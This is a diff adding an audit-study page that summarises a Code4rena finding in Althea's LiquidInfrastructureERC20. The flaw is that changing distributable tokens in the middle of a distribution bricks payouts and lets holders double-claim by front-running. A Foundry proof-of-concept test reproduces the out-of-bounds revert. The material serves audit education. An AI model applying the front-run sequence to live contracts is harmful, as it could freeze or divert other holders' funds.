@@ -1,0 +1,96 @@
+# ETAAcademy-Adudit: 5. NFT
+
+<table>
+  <tr>
+    <th>title</th>
+    <th>tags</th>
+  </tr>
+  <tr>
+    <td>05. NFT</td>
+    <td>
+      <table>
+        <tr>
+          <th>audit</th>
+          <th>basic</th>
+          <th>DeFi</th>
+          <td>NFT</td>
+        </tr>
+      </table>
+    </td>
+  </tr>
+</table>
+
+[Github](https://github.com/ETAAcademy)｜[Twitter](https://twitter.com/ETAAcademy)｜[ETA-Audit](https://github.com/ETAAcademy/ETAAcademy-Audit)
+
+Authors: [Eta](https://twitter.com/pwhattie), looking forward to your joining
+
+## 1.[Medium] Distribution can be bricked, and double claims by a few holders are possible when owner calls LiquidInfrastructureERC20::setDistributableERC20s
+
+### Double claiming and bricking distribution
+
+- Summary: Adding a new token can trigger reverts during distribution due to changes in array lengths, while attackers can front-run distribution, resulting in out-of-bounds reverts. Additionally, holders can exploit front-running to distribute rewards and back-run to claim rewards, leading to double claiming and losses for other holders.
+
+- Impact & Recommendation: Removing tokens can cause a loss of token balance until re-added by the owner. To mitigate these risks, it's essential to validate **`setDistributableERC20s`** to prevent changes before distributions occur.
+  <br> 🐬: [Source](https://code4rena.com/reports/2024-02-althea-liquid-infrastructure#m-03--distribution-can-be-bricked-and-double-claims-by-a-few-holders-are-possible-when-owner-calls-liquidinfrastructureerc20setdistributableerc20s) & [Report](https://code4rena.com/reports/2024-02-althea-liquid-infrastructure)
+
+  <details><summary>POC</summary>
+
+  ```solidity
+    // SPDX-License-Identifier: UNLICENSED
+    pragma solidity 0.8.12;
+    import {Test, console2} from "forge-std/Test.sol";
+    import {LiquidInfrastructureERC20} from "../contracts/LiquidInfrastructureERC20.sol";
+    import {LiquidInfrastructureNFT} from "../contracts/LiquidInfrastructureNFT.sol";
+    import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
+    contract AltheaTest is Test {
+        function setUp() public {}
+        function test_POC() public {
+            // setup
+            LiquidInfrastructureNFT nft = new LiquidInfrastructureNFT("LP");
+            address[] memory newErc20s = new address[](1);
+            uint256[] memory newAmounts = new uint[](1);
+
+            ERC20 DAI = new ERC20("DAI", "DAI");
+            ERC20 USDC = new ERC20("USDC", "USDC");
+            string memory _name = "LP";
+            string memory _symbol = "LP";
+            uint256 _minDistributionPeriod = 5;
+            address[] memory _managedNFTs = new address[](1);
+            address[] memory _approvedHolders = new address[](2);
+            address[] memory _distributableErc20s = new address[](1);
+            _managedNFTs[0] = address(nft);
+            _approvedHolders[0] = address(1);
+            _approvedHolders[1] = address(2);
+            _distributableErc20s[0] = address(DAI);
+            newErc20s[0] = address(DAI);
+            nft.setThresholds(newErc20s, newAmounts);
+            LiquidInfrastructureERC20 erc = new  LiquidInfrastructureERC20(
+                _name, _symbol, _managedNFTs, _approvedHolders, _minDistributionPeriod, _distributableErc20s);
+            erc.mint(address(1), 100e18);
+            erc.mint(address(2), 100e18);
+            // issue ==  change in desirable erc20s
+            _distributableErc20s = new address[](2);
+            _distributableErc20s[0] = address(DAI);
+            _distributableErc20s[1] = address(USDC);
+            newAmounts = new uint[](2);
+            newErc20s = new address[](2);
+            newErc20s[0] = address(DAI);
+            newErc20s[1] = address(USDC);
+            nft.setThresholds(newErc20s, newAmounts);
+            deal(address(DAI), address(erc), 1000e18);
+            deal(address(USDC), address(erc), 1000e18);
+            vm.roll(block.number + 100);
+            // frontrun tx
+            erc.distribute(1);
+            // victim tx
+            erc.setDistributableERC20s(_distributableErc20s);
+            // backrun tx
+            vm.roll(block.number + _minDistributionPeriod);
+            vm.expectRevert(); // Index out of bounds
+            erc.distribute(1);
+        }
+    }
+
+  ```
+
+  </details>
